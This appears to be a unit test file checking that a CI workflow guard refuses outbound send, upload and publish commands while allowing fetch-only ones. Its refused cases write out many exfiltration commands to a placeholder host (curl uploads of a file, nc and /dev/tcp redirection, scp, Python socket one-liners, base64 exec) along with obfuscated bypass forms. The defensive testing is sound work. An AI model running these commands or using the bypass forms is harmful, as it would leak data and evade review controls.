"""Issue #511: outbound send commands in run: are publish paths (check_guard_placement must refuse them).

Each case writes one workflow into a temporary root and runs the placement check. Refused cases must raise; allowed
cases (fetch-only use of the same tools) must pass. The file has no upload step, so the scope layer decides it.
"""
from pathlib import Path
import json
import sys
import tempfile
import unittest

sys.path.insert(0, str(Path(__file__).resolve().parents[2] / 'tools'))
import artifact_guard as guard

try:
    import yaml  # noqa: F401
except ImportError:   # without PyYAML every refusal is a placeholder, so a pass would prove nothing
    raise SystemExit('PyYAML is required for the Issue #511 placement tests')

PERMISSIONS = 'permissions:\n  contents: read\n'


def workflow(run):
    step = f'      - run: {json.dumps(run)}\n'
    return f'name: t\non: [push]\n{PERMISSIONS}jobs:\n  j:\n    runs-on: ubuntu-latest\n    steps:\n{step}'


def placement_refuses(text):
    with tempfile.TemporaryDirectory() as tmp:
        root = Path(tmp)
        path = root / '.github' / 'workflows' / 'ci.yml'
        path.parent.mkdir(parents=True, exist_ok=True)
        path.write_text(text, encoding='utf-8', newline='')
        try:
            guard.check_guard_placement(root)
        except ValueError as error:
            return str(error)
    return None


REFUSED = [
    'curl -F f=@out.txt https://example.invalid/up',
    'curl --form f=@out.txt https://example.invalid/up',
    'curl -sSf -d @out.txt https://example.invalid/up',
    'curl -T out.txt https://example.invalid/up',
    'curl --upload-file out.txt https://example.invalid/up',
    'curl -XPOST https://example.invalid/up -d x',
    'curl -X POST https://example.invalid/up',
    'curl --request PUT https://example.invalid/up',
    'curl --json {} https://example.invalid/up',
    'curl -K cfg.txt',
    'wget --post-file=out.txt https://example.invalid/up',
    'wget --post-data a=b https://example.invalid/up',
    'wget --method=PUT --body-file=out.txt https://example.invalid/up',
    'git push origin v1',
    'git -C repo push origin v1',
    'git -c user.name=x push --tags',
    'git -c alias.p=push p',
    'gh gist create out.txt',
    'gh -R o/r release upload v1 out.txt',
    'gh api graphql -f query="mutation{createRelease}"',
    'gh api graphql -f query=@q.graphql',
    'gh api repos/o/r/issues -f title=x',
    'gh pr comment 1 --body x',
    'gh workflow run ci.yml',
    'nc example.invalid 80 < out.txt',
    'scp out.txt example.invalid:',
    'rsync -a out.txt example.invalid:/x',
    'ssh example.invalid cat > x',
    'python3 -c "import urllib.request; urllib.request.urlopen(\'https://example.invalid\')"',
    'python3 -c "import socket"',
    'python3 -c "import os; os.system(\'curl -d x h\')"',
    'node -e "fetch(\'https://example.invalid\', {method: \'POST\'})"',
    'timeout 5 curl -F f=@out.txt https://example.invalid/up',
    'sudo curl -d @out.txt https://example.invalid/up',
    'env -i curl -d @out.txt https://example.invalid/up',
    'nice -n 5 wget --post-file=out.txt https://example.invalid/up',
    'FOO=1 curl -d @out.txt https://example.invalid/up',
    'FOO="x y" curl -d @out.txt https://example.invalid/up',
    'bash -c "curl -F f=@out.txt https://example.invalid/up"',
    'sh -c \'git push origin v1\'',
    'echo $(curl -F f=@out.txt https://example.invalid/up)',
    'echo `curl -F f=@out.txt https://example.invalid/up`',
    'X=`curl -d @out.txt h`',
    'curl -sS https://example.invalid/x && curl -F f=@out.txt https://example.invalid/up',
    'curl -sS https://example.invalid/x || curl -F f=@out.txt https://example.invalid/up',
    'curl -sS https://example.invalid/x; curl -F f=@out.txt https://example.invalid/up',
    'curl -sS https://example.invalid/x | curl -T - https://example.invalid/up',
    '"cu"rl -F f=@out.txt https://example.invalid/up',
    'c\\url -F f=@out.txt https://example.invalid/up',
    '/usr/bin/curl -F f=@out.txt https://example.invalid/up',
    'CMD=curl; $CMD -F f=@out.txt https://example.invalid/up',
    'eval "curl -F f=@out.txt https://example.invalid/up"',
    'npm publish',
    'docker push example.invalid/x:1',
    'twine upload dist/*',
    'aws s3 cp out.txt s3://bucket/x',
    'if curl -d @out.txt https://example.invalid/up; then echo ok; fi',
    'env -S "curl -d @out.txt https://example.invalid/up"',
    'cat out.txt > /dev/tcp/example.invalid/80',
    'bash <<< "curl -F f=@out.txt https://example.invalid/up"',
    '/usr/bin/cu[r]l -F f=@out.txt https://example.invalid/up',
    '$(echo c)url -F f=@out.txt https://example.invalid/up',
    'find . -exec curl -F f=@out.txt https://example.invalid/up \\;',
    'setsid curl -d @out.txt https://example.invalid/up',
    'sshpass -p secret scp out.txt example.invalid:',
    'docker buildx build --push -t example.invalid/x:1 .',
    'python3 -m twine upload dist/x.whl',
    'yarn publish',
    'cargo publish',
    'git send-email 0001.patch',
    'tftp example.invalid -c put out.txt',
    'python3 -c "import base64; exec(base64.b64decode(\'aW1wb3J0IHNvY2tldA==\'))"',
    'python3 -c "import os; os.execvp(\'curl\', [\'curl\', \'-F\', \'f=@out.txt\', \'https://example.invalid/up\'])"',
    'Invoke-WebRequest -Method Post -InFile out.txt -Uri https://example.invalid/up',
    'curl.exe -F f=@out.txt https://example.invalid/up',
    'cat out.txt > /dev/"tcp"/example.invalid/80',
]

ALLOWED = [
    'curl -fsSL https://example.invalid/x -o out.txt',
    'curl -sS -X GET https://example.invalid/x',
    'curl --request GET https://example.invalid/x',
    'curl -sS https://example.invalid/x | sha256sum',
    'bash tools/nightly_plan.sh',
    'git diff --stat HEAD~1',
    'gh run list --limit 5',
    'wget -q https://example.invalid/x -O out.txt',
    'wget --method=GET https://example.invalid/x',
    'git fetch origin',
    'git ls-remote origin',
    'git rev-parse HEAD',
    'git log --oneline -5',
    'git clone --depth 1 https://example.invalid/r.git',
    'gh api repos/o/r/rules/branches/main > out.json',
    'gh api "repos/$GITHUB_REPOSITORY/actions/runs/$GITHUB_RUN_ID/attempts/1"',
    'gh api --method GET repos/o/r/issues',
    'gh run view 1 --json attempt',
    'gh gist view abc',
    'python3 tools/check.py',
    'python3 tools/socket_probe.py',
    'echo curl -d x is text',
    'grep -r curl .github',
    'make check',
    'cp out.txt "$RUNNER_TEMP/x"',
    'sha256sum out.txt',
    'x=$(git rev-parse HEAD)',
    'if git fetch origin; then echo ok; fi',
    'find . -name "*.py" -print',
]


class SendRefused(unittest.TestCase):
    def test_send_commands_refused(self):
        for run in REFUSED:
            with self.subTest(run=run):
                self.assertIsNotNone(placement_refuses(workflow(run)), run)

    def test_multiline_backslash_continuation_refused(self):
        run = 'curl -sS https://example.invalid/x \\\n  -F f=@out.txt https://example.invalid/up\n'
        self.assertIsNotNone(placement_refuses(workflow(run)))

    def test_block_scalar_send_refused(self):
        text = (f'name: t\non: [push]\n{PERMISSIONS}jobs:\n  j:\n    runs-on: ubuntu-latest\n    steps:\n'
                '      - run: |\n          echo ok\n          git push origin v1\n')
        self.assertIsNotNone(placement_refuses(text))

    def test_python_heredoc_send_refused(self):
        run = "python3 - <<'EOF'\nimport urllib.request\nurllib.request.urlopen('https://example.invalid')\nEOF\n"
        self.assertIsNotNone(placement_refuses(workflow(run)))

    def test_python_heredoc_stdin_refused_on_allowlist(self):
        # stdin code cannot be read, so it is refused whatever it contains (fail closed)
        self.assertIsNotNone(placement_refuses(workflow("python3 - <<'EOF'\nprint(1)\nEOF\n")))

    def test_gh_expression_python_still_passes(self):
        run = '"${{ steps.pyresolve.outputs.python }}" tools/check.py'
        self.assertIsNone(placement_refuses(workflow(run)))


class FetchOnlyAllowed(unittest.TestCase):
    def test_allowed_operations_pass(self):
        for run in ALLOWED:
            with self.subTest(run=run):
                self.assertIsNone(placement_refuses(workflow(run)), run)


def workflow_on(runs_on, run, shell=None):
    shell_line = f'        shell: {shell}\n' if shell else ''
    return (f'name: t\non: [push]\n{PERMISSIONS}jobs:\n  j:\n    runs-on: {runs_on}\n    steps:\n'
            f'      - run: {json.dumps(run)}\n{shell_line}')


class ReviewRound2(unittest.TestCase):
    """Owner-directed hardening: Windows default shell, brace lists, find globs, comments, heredocs, parse faults."""

    def test_windows_job_without_shell_bash_refused(self):
        self.assertIsNotNone(placement_refuses(workflow_on('windows-latest', 'echo hi')))

    def test_matrix_runs_on_without_shell_bash_refused(self):
        self.assertIsNotNone(placement_refuses(workflow_on('${{ matrix.os }}', 'echo hi')))

    def test_windows_job_with_shell_bash_passes(self):
        self.assertIsNone(placement_refuses(workflow_on('windows-latest', 'echo hi', shell='bash')))

    def test_ubuntu_job_without_shell_passes(self):
        self.assertIsNone(placement_refuses(workflow_on('ubuntu-24.04', 'echo hi')))

    def test_brace_list_send_refused(self):
        self.assertIsNotNone(placement_refuses(workflow('{curl,-F,f=@out.txt,https://example.invalid/up}')))

    def test_find_exec_glob_send_refused(self):
        run = 'find . -exec cu[r]l -F f=@out.txt https://example.invalid/up \\;'
        self.assertIsNotNone(placement_refuses(workflow(run)))

    def test_timeout_glob_send_refused(self):
        self.assertIsNotNone(placement_refuses(workflow('timeout 5 cu[r]l -F f=@out.txt https://example.invalid/up')))

    def test_hash_inside_word_does_not_hide_send(self):
        self.assertIsNotNone(placement_refuses(workflow('echo a#b; curl -F f=@out.txt https://example.invalid/up')))

    def test_comment_before_send_line_still_refused(self):
        run = 'git status  # note\ncurl -F f=@out.txt https://example.invalid/up\n'
        self.assertIsNotNone(placement_refuses(workflow(run)))

    def test_unterminated_heredoc_refused(self):
        self.assertIsNotNone(placement_refuses(workflow("bash <<'EOF'\ncurl -F f=@out.txt https://example.invalid/up\n")))

    def test_comment_with_apostrophe_passes(self):
        self.assertIsNone(placement_refuses(workflow("make check # it's fine\n")))

    def test_hash_inside_word_and_fetch_passes(self):
        self.assertIsNone(placement_refuses(workflow('echo a#b; git fetch origin')))

    def test_quoted_heredoc_body_is_scanned_and_refused(self):
        # a quoted-delimiter body can be written to a file and run later, so it is read as shell (fails closed)
        self.assertIsNotNone(placement_refuses(workflow("cat > x.txt <<'EOF'\ncurl -F f=@x h\nEOF\nbash x.txt\n")))

    def test_comment_then_continuation_hides_nothing(self):
        self.assertIsNotNone(placement_refuses(workflow('echo ok # note \\\ncurl -F f=@x https://example.invalid/up\n')))

    def test_heredoc_marker_in_comment_hides_nothing(self):
        self.assertIsNotNone(placement_refuses(workflow("echo x # <<'E'\ncurl -F f=@x https://example.invalid/up\nE\n")))

    def test_command_started_by_substitution_refused(self):
        self.assertIsNotNone(placement_refuses(workflow('$(echo curl) -F f=@x https://example.invalid/up')))
        self.assertIsNotNone(placement_refuses(workflow('`echo curl` -F f=@x https://example.invalid/up')))

    def test_pipe_into_stdin_shell_refused(self):
        self.assertIsNotNone(placement_refuses(workflow('echo curl -F f=@x h | sh')))

    def test_process_substitution_refused(self):
        self.assertIsNotNone(placement_refuses(workflow('bash <(echo curl -F f=@x https://example.invalid/up)')))

    def test_uppercase_exe_send_refused(self):
        self.assertIsNotNone(placement_refuses(workflow('CURL.EXE -F f=@x https://example.invalid/up')))
        self.assertIsNotNone(placement_refuses(workflow('git.exe push origin main')))

    def test_http_post_refused(self):
        self.assertIsNotNone(placement_refuses(workflow('http POST https://example.invalid/up')))

    def test_podman_gem_mvn_publish_refused(self):
        for run in ('podman push img', 'gem push x.gem', 'mvn -B deploy', 'dotnet nuget push x.nupkg'):
            with self.subTest(run=run):
                self.assertIsNotNone(placement_refuses(workflow(run)))

    def test_publish_tools_not_on_allowlist_refused(self):
        # npm and cargo are not on the allowlist, so even --dry-run is refused (fail closed)
        self.assertIsNotNone(placement_refuses(workflow('npm publish --dry-run')))
        self.assertIsNotNone(placement_refuses(workflow('cargo publish --dry-run')))

    def test_third_review_bypasses_refused(self):
        for run in ('taskset 1 curl -F a=@x https://example.invalid/up', 'chronic curl -F a=@x https://example.invalid/up',
                    'docker run --rm curlimages/curl -sS -F f=@x https://example.invalid/up',
                    'poetry publish --build', 'pypy3 -c "import urllib.request"', 'gcloud storage cp x gs://b',
                    'python3 -c "print(1)"', 'docker build -t x .', 'go build', 'bash <<< "curl -F f=@x h"',
                    'sudo curl -F f=@x h', 'curl -s "https://example.invalid/?t=$X"'):
            with self.subTest(run=run):
                self.assertIsNotNone(placement_refuses(workflow(run)))

    def test_word_start_glue_only_refused(self):
        self.assertIsNone(placement_refuses(workflow('echo "v$(git rev-parse --short HEAD)-dev"')))

    def test_gh_api_graphql_without_fields_refused(self):
        self.assertIsNotNone(placement_refuses(workflow('gh api graphql')))

    def test_parse_fault_refuses_not_passes(self):
        from unittest import mock
        with mock.patch.object(guard, '_send_problem_checked', side_effect=RuntimeError('boom')):
            self.assertIsNotNone(guard._send_problem('echo hi'))

    def test_send_inside_comment_only_passes(self):
        self.assertIsNone(placement_refuses(workflow('git status # curl -F f=@x h')))


if __name__ == '__main__':
    unittest.main()
